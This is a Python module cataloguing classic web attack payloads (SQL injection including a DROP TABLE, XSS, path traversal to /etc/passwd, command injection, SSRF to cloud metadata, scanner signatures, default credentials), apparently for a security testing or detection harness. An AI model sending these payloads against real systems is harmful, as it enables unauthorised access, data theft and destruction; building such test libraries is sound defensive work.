from __future__ import annotations

from dataclasses import dataclass
from typing import List, Dict

@dataclass
class AttackPayload:
    payload: str
    category: str
    severity: str
    cwe_id: str
    description: str
    target_endpoint: str
    method: str
    param_name: str

SQL_INJECTION_PAYLOADS = [
    AttackPayload("' OR 1=1--", "sql_injection", "high", "CWE-89", "Basic auth bypass", "/login", "POST", "username"),
    AttackPayload("' UNION SELECT username,password FROM users--", "sql_injection", "high", "CWE-89", "Union based data exfiltration", "/search", "GET", "q"),
    AttackPayload("'; DROP TABLE users;--", "sql_injection", "critical", "CWE-89", "Stacked queries", "/comments", "POST", "body"),
    AttackPayload("1' AND SLEEP(5)--", "sql_injection", "high", "CWE-89", "Time-based blind SQLi", "/search", "GET", "q"),
]

XSS_PAYLOADS = [
    AttackPayload("<script>alert(1)</script>", "xss", "medium", "CWE-79", "Basic XSS", "/greet", "GET", "name"),
    AttackPayload("<img src=x onerror=alert(1)>", "xss", "medium", "CWE-79", "Img tag XSS", "/greet", "GET", "name"),
    AttackPayload("<svg onload=alert(1)>", "xss", "medium", "CWE-79", "SVG XSS", "/greet", "GET", "name"),
    AttackPayload("javascript:alert(1)", "xss", "medium", "CWE-79", "Event handler injection", "/greet", "GET", "name"),
]

PATH_TRAVERSAL_PAYLOADS = [
    AttackPayload("../../../etc/passwd", "path_traversal", "high", "CWE-22", "Basic traversal", "/file", "GET", "name"),
    AttackPayload("....//....//etc/passwd", "path_traversal", "high", "CWE-22", "Bypass basic filter", "/file", "GET", "name"),
    AttackPayload("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "path_traversal", "high", "CWE-22", "URL-encoded traversal", "/file", "GET", "name"),
    AttackPayload("..\\..\\..\\windows\\win.ini", "path_traversal", "high", "CWE-22", "Windows basic traversal", "/file", "GET", "name"),
]

COMMAND_INJECTION_PAYLOADS = [
    AttackPayload("; ls -la", "command_injection", "critical", "CWE-78", "Basic injection", "/ping", "GET", "host"),
    AttackPayload("| cat /etc/passwd", "command_injection", "critical", "CWE-78", "Pipe injection", "/ping", "GET", "host"),
    AttackPayload("`whoami`", "command_injection", "critical", "CWE-78", "Backtick injection", "/ping", "GET", "host"),
    AttackPayload("$(id)", "command_injection", "critical", "CWE-78", "Subshell injection", "/ping", "GET", "host"),
    AttackPayload("& dir", "command_injection", "critical", "CWE-78", "Windows ampersand injection", "/ping", "GET", "host"),
]

SSRF_PAYLOADS = [
    AttackPayload("http://169.254.169.254/latest/meta-data/", "ssrf", "high", "CWE-918", "AWS Metadata access", "/fetch", "GET", "url"),
    AttackPayload("http://localhost:22", "ssrf", "high", "CWE-918", "Local port scan", "/fetch", "GET", "url"),
    AttackPayload("http://127.0.0.1:5000/admin/users", "ssrf", "high", "CWE-918", "Local admin access", "/fetch", "GET", "url"),
    AttackPayload("file:///etc/passwd", "ssrf", "high", "CWE-918", "Local file access", "/fetch", "GET", "url"),
]

RECON_PAYLOADS = [
    AttackPayload("sqlmap/1.5", "reconnaissance", "low", "CWE-200", "SQLMap scan", "/", "GET", ""),
    AttackPayload("Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)", "reconnaissance", "low", "CWE-200", "Nmap NSE scan", "/", "GET", ""),
    AttackPayload("Nikto/2.1.6", "reconnaissance", "low", "CWE-200", "Nikto scan", "/", "GET", ""),
    AttackPayload("Wfuzz/3.1.0", "reconnaissance", "low", "CWE-200", "Wfuzz dirbusting", "/admin", "GET", ""),
    AttackPayload("DirBuster-1.0-RC1", "reconnaissance", "low", "CWE-200", "DirBuster scan", "/login", "GET", ""),
]

BRUTE_FORCE_PAYLOADS = [
    AttackPayload("admin:password", "brute_force", "medium", "CWE-307", "Common weak creds", "/login", "POST", "username"),
    AttackPayload("admin:admin", "brute_force", "medium", "CWE-307", "Common weak creds", "/login", "POST", "username"),
    AttackPayload("admin:123456", "brute_force", "medium", "CWE-307", "Common weak creds", "/login", "POST", "username"),
    AttackPayload("root:root", "brute_force", "medium", "CWE-307", "Common weak creds", "/login", "POST", "username"),
    AttackPayload("test:test", "brute_force", "medium", "CWE-307", "Common weak creds", "/login", "POST", "username"),
]

_ALL_PAYLOADS = {
    "sql_injection": SQL_INJECTION_PAYLOADS,
    "xss": XSS_PAYLOADS,
    "path_traversal": PATH_TRAVERSAL_PAYLOADS,
    "command_injection": COMMAND_INJECTION_PAYLOADS,
    "ssrf": SSRF_PAYLOADS,
    "reconnaissance": RECON_PAYLOADS,
    "brute_force": BRUTE_FORCE_PAYLOADS,
}

def get_payloads(category: str) -> List[AttackPayload]:
    """Retrieve payloads for a given attack category."""
    return _ALL_PAYLOADS.get(category, [])

def get_all_categories() -> List[str]:
    """Return all available payload categories."""
    return list(_ALL_PAYLOADS.keys())
